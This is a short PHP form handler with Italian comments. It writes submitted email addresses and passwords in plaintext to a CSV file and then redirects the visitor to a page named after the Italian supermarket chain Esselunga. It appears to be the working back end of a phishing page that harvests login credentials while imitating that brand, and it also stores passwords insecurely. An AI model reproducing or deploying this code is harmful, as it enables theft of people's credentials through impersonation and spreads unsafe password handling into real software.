<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Prendi i dati dal modulo
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Salva i dati in un file CSV
    $file = 'registrazioni.csv'; // Nome del file CSV
    $data = array($email, $password); // Dati da salvare
    
    // Apre il file in modalità 'append' (aggiungi alla fine del file)
    $handle = fopen($file, 'a');

    // Scrivi una nuova riga nel CSV
    fputcsv($handle, $data);

    // Chiudi il file
    fclose($handle);

    // Reindirizza alla pagina di successo (home o altro)
    header("Location: Esselunga.html");
    exit();
}
?>
